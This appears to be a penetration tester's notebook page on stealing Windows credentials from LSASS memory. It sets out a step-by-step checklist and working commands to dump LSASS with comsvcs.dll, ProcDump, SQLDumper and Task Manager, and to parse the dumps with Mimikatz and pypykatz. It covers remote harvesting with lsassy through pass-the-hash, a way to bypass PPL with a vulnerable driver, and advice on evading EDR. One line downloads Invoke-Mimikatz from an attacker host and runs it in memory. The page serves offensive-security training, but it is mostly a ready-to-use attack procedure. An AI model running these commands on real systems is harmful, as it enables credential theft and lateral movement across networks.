---
created: 2026-07-21
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
  - living_off_the_land
status: complete
---

> [!abstract]+ **Scope**: LSASS architecture and credential storage; live memory parsing; creating process minidumps with `comsvcs.dll`, `procdump`, task manager, and `SQLDumper`; offline credential extraction with `pypykatz` and Mimikatz; remote dumping with `lsassy`; LSA protection (PPL) and Credential Guard considerations.

- [ ] Verify `SeDebugPrivilege` or local administrator access on the target host.
- [ ] Check if LSA protection (PPL) or Credential Guard is active.
- [ ] Export an LSASS process minidump using native utilities (`comsvcs.dll`, `procdump`, `SQLDumper`, task manager).
- [ ] Transfer the minidump file to your local attack host.
- [ ] Parse extracted credentials offline using `pypykatz` or Mimikatz `sekurlsa::minidump`.
- [ ] Delete temporary minidump files from the target disk.

## LSA and LSASS

> **Local Security Authority (LSA)** is the Windows security subsystem responsible for authentication, authorization, and local security policy enforcement.

- The LSA is an architectural subsystem rather than a single process. Its functionality is implemented by multiple components, including `lsass.exe` and the security packages it loads.

> [!note] See [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29#lsass-process-memory).

> **LSASS (Local Security Authority Subsystem Service)** is the user-mode process (`lsass.exe`) that enforces security policies, handles user authentication, and stores active credential material in memory under `NT AUTHORITY\SYSTEM`.

- Windows implements authentication protocols through authentication packages and **Security Support Providers (SSPs)**. These DLLs load into the LSASS process dynamically at system startup or on demand.

| Package / SSP | DLL | Credential material and functionality |
| :--- | :--- | :--- |
| `MSV1_0` (NTLM) | `msv1_0.dll` | NT password hashes and LM hashes; authentication state used by NTLM. |
| `Kerberos` | `kerberos.dll` | Kerberos Ticket-Granting Tickets (TGTs), Service Tickets (STs), and session keys. |
| `CredSSP` | `credssp.dll` | Delegated credentials used for RDP and PowerShell remoting. |
| `WDigest` | `wdigest.dll` | Plaintext passwords associated with legacy HTTP digest authentication. |
| `LiveSSP` | `livessp.dll` | Authentication material associated with Microsoft account sign-ins. |
| `Tspkg` | `tspkg.dll` | Legacy Terminal Services authentication material. |
| `CloudAP` | `cloudap.dll` | Authentication material associated with Microsoft Entra ID sign-in. |

>[!note]- WDigest
>- WDigest is a legacy authentication package that caches plaintext passwords in LSASS memory when plaintext credential storage is enabled.
>- The package was enabled by default in Windows XP through Windows 8 and Windows Server 2012 R2. On modern versions, it's disabled by default but can be re-enabled by setting `UseLogonCredential` to `1` in `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`.
>- When WDigest is active, Mimikatz's `sekurlsa::logonpasswords` returns plaintext passwords in addition to NT hashes.

- LSASS maintains *authentication state for active logon sessions*. It stores credential material in memory — such as NT hashes and Kerberos tickets — depending on SSPs in use.
- If you can read LSASS process memory, you can potentially **extract those credentials and use them for privilege escalation and lateral movement**.

> [!important] Reading LSASS process memory requires `SeDebugPrivilege` or `SYSTEM` access. By default, this privilege is assigned to members of the `Administrators` group.

> [!note] See [[SeDebugPrivilege]].

### LSA protection (PPL)

- LSA protection runs LSASS as a **Protected Process Light (PPL)**. This prevents non-protected user-mode processes from opening handles to LSASS with read access (`PROCESS_VM_READ`), even when `SeDebugPrivilege` is enabled.

> [!note] See [`Configure added LSA protection — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).

- Check whether LSA protection (PPL) is enabled via the Windows registry:

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
```

| Parameter | Value | Description |
| :--- | :--- | :--- |
| `-Path` | `"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"` | Registry path to the LSA configuration key. |
| `-Name` | `"RunAsPPL"` | Value name (`1` indicates PPL is enabled; `0` or absent indicates disabled). |

- You can bypass LSA protection by loading a vulnerable signed driver, such as `RTCore64.sys`, to remove the PPL protection bit in kernel memory. This technique is known as **Bring Your Own Vulnerable Driver (BYOVD)**.

> [!note] See [[SeLoadDriverPrivilege#Disabling LSASS protection with RTCore64.sys]].

### Credential guard

> **Credential Guard** is a Windows security feature that uses Virtualization-based Security (VBS) to isolate LSA secrets inside the isolated `LSAIso.exe` process.

- Credential Guard isolates sensitive LSA secrets in the `LSAIso.exe` process (Virtual Secure Mode). `lsass.exe` communicates with `LSAIso.exe` via RPC but doesn't store raw plaintext passwords or NTLM master keys in its own memory space.
- Dumping `lsass.exe` on a system with Credential Guard enabled doesn't expose the isolated secrets.

> [!note] See [`Credential Guard overview — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/).

## Acquiring LSASS memory dumps

- Reading another process's memory on Windows requires `SeDebugPrivilege`.

- Check your current privileges:

```powershell
whoami /priv
```

>[!note]+ Full dumps vs. minidumps
>- **Minidumps** capture process headers, thread stacks, and loaded modules. They produce small files (typically 10–50 MB) that are easier to transfer across systems.
>- **Full dumps** capture the entire virtual address space of `lsass.exe`. They take longer to generate and produce significantly larger files.
>
>>[!important] For extracting credentials from LSASS memory, **minidumps** are usually sufficient. 

- Determine the process ID (PID) of `lsass.exe`:

```powershell
Get-Process -Name lsass | Select-Object -Property Id, ProcessName
```
```cmd
tasklist /fi "imagename eq lsass.exe"
```

>[!note] See [`OS Credential Dumping: LSASS Memory — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/001/).

### Dumping LSASS with `comsvcs.dll`

- `comsvcs.dll` is a signed Windows DLL located at `C:\Windows\System32\comsvcs.dll`. It exports the `MiniDump` function (ordinal `24`), which calls the native Win32 [`MiniDumpWriteDump()`](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) API.
- Create a minidump of the LSASS process using `comsvcs.dll` (executed with `rundll32.exe`):

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

>[!note] See [`Comsvcs.dll — LOLBAS Project`](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/).

### Dumping LSASS with `ProcDump`

- [`ProcDump`](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) is a command-line utility from Microsoft Sysinternals suite that can be used to create process memory dumps.
- Create a minidump of the LSASS process using `ProcDump`:

```powershell
.\procdump.exe -accepteula -ma <LSASS_PID> C:\Temp\lsass.dmp
```

- `-ma` requests a **full memory dump**; without `-ma`, `ProcDump` creates a **minidump**.
- `-accepteula` suppresses the EULA dialog (required for non-interactive sessions).

>[!note] See [`Procdump.exe — LOLBAS Project`](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/).

### Dumping LSASS with `Task Manager`

- If you have an interactive GUI session (such as RDP), you can create a dump file directly in `Task Manager`:
	1. Open `Task Manager` with elevated privileges (administrative or with `SeDebugPrivilege`).
	2. Navigate to the `Details` tab.
	3. Locate and right-click `lsass.exe` (`Local Security Authority Process`).
	4. Select `Create dump file`.
- Windows typically writes memory dumps created manually in `Task Manager` to `%LocalAppData%\Temp` (`C:\Users\<Username>\AppData\Local\Temp`).

>[!note] See [`Task Manager live memory dump — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/task-manager-live-dump).

### Dumping LSASS with `SQLDumper`

- `SQLDumper.exe` is a debugging utility shipped with Microsoft SQL Server, Power BI, and Office, used to generate process memory dumps. The executable is typically located in the SQL Server `Shared` directory (`C:\Program Files\Microsoft SQL Server\<InstanceID>\Shared\SQLDumper.exe`).

- Generate a full memory dump of the LSASS process:

```powershell
SQLDumper.exe <LSASS_PID> 0 0x01100 0 C:\Temp\lsass.dmp
```

- Generate a minidump:

```powershell
SQLDumper.exe <LSASS_PID> 0 0x0120 0 C:\Temp\lsass.dmp
```

>[!note] See [`Use the Sqldumper.exe tool to generate a dump file in SQL Server — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/sql/tools/use-sqldumper-generate-dump-file) and [`Sqldumper.exe — LOLBAS Project`](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/).

## Extracting credentials from LSASS memory dumps offline

- To analyze the acquired dump and extract credentials from it, you can use [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `sekurlsa::minidump` module (on Windows) or [`pypykatz`](https://github.com/skelsec/pypykatz) (on Linux).

### Extracting credentials with Mimikatz

- The `sekurlsa::minidump` module loads an LSASS memory dump file into Mimikatz for offline analysis.

- Load the dump file and extract cached logon credentials:

```powershell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

- `sekurlsa::logonpasswords` (now operating on the dump file `sekurlsa::minidump` loaded) extracts credentials from all available providers.

>[!interesting] Internally, `sekurlsa::logonpasswords` opens a handle to the LSASS process using Win32 API ([`OpenProcess()`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)), then scans the process's memory for known structures loaded by security packages (e.g., `MSV1_0`, `Kerberos`, `WDigest`), decodes them, and renders in PowerShell.

>[!note] See [`sekurlsa::minudump — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/minidump) and [`sekurlsa::logonpasswords — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/logonpasswords).

### Extracting credentials with `pypykatz`

- To extract credentials from an LSASS memory dump on a Linux machine, you can use [`pypykatz`](https://github.com/skelsec/pypykatz):

```bash
pypykatz lsa minidump lsass.dmp
```

>[!note]+ Installation
> ```bash
> pip3 install pypykatz
> ```

## Extracting credentials from live memory using Mimikatz

- Mimikatz can extract credentials directly from live LSASS memory on a target system, provided it has sufficient privileges to access the process (`SeDebugPrivileges`).
- Run Mimikatz to extract credentials from live memory:

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

- `privilege::debug` enables `SeDebugPrivilege` for the current Mimikatz process, and `sekurlsa::logonpasswords` reads live LSASS process memory and extracts cached credentials. 

>[!tip]+ 
> - You can run Mimikatz in memory without writing binaries to disk using [`Invoke-Mimikatz.ps1`](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) ([`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)):
> ```powershell
> powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip_address>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
> ```

>[!interesting] `Invoke-Mimikarz.ps1` uses reflective [PE injection](https://attack.mitre.org/techniques/T1055/002/) to load the Mimikatz DLL into the PowerShell process without writing an executable to disk.

> [!warning] Live memory inspection can trigger EDR alerts and endpoint detection rules. Extracting an offline minidump or using remote harvesting techniques is usually less noisy.

>[!note] See [`privilege::debug — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug).

## Extracting credentials remotely with `lsassy`

- [`lsassy`](https://github.com/login-securite/lsassy) is a Python tool that can remotely extract credentials from multiple Windows hosts. It dumps LSASS over SMB or WMI and automatically parses the returned credential hashes using [`pypykatz`](https://github.com/skelsec/pypykatz). It can be considered an automation wrapper around existing tools. 

>[!note]+ Installation
>```bash
>python3 -m pip install lsassy
>```

- Authenticate using a plaintext password and extract credentials:

```bash
lsassy -d <domain> -u <user> -p <password> <targets>
```

```bash
lsassy -d example.com -u jdoe -p 'passwd123' 10.10.11.5
```

- Extract credentials using [[🛠️ Pass-the-Hash]]:

```bash
lsassy -u <user> -H <NT_hash> <targets>
```

```bash
lsassy -u jdoe -H 31d6cfe0d16ae931b73c59d7e0c089c0 10.10.11.5
```

- Extract credentials using Kerberos [[Pass-the-Ticket]]:

```bash
lsassy -k <targets>
```
```bash
lsassy -k 10.10.11.5
```

| Flag        | Description                                                            |
| :---------- | :--------------------------------------------------------------------- |
| `-d`        | Target Active Directory domain FQDN.                                   |
| `-u`        | Username for authentication.                                           |
| `-p`        | Plaintext password for authentication.                                 |
| `-H`        | NTLM hash for Pass-the-Hash authentication.                            |
| `-k`        | Uses existing Kerberos tickets (from `KRB5CCNAME`) for authentication. |
| `<targets>` | Target IP address or hostname.                                         |

## References and further reading

- [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication-model)
- [`Security Support Provider Interface Architecture — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture)
- [`Cached and Stored Credentials Technical Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29)
- [`Configuring Additional LSA Protection — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [`Credential Guard Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [`LSASS Secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)
- [`Comsvcs.dll — LOLBAS Project`](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
- [`OS Credential Dumping: LSASS Memory — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/001/)
- [`Procdump.exe — LOLBAS Project`](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/)
- [`Task Manager live memory dump — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/task-manager-live-dump)
- [`Use the Sqldumper.exe tool to generate a dump file in SQL Server — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/sql/tools/use-sqldumper-generate-dump-file)
- [`Sqldumper.exe — LOLBAS Project`](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/)
- [`sekurlsa::minidump — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/minidump)
- [`sekurlsa::logonpasswords — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/logonpasswords)
- [`privilege::debug — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug)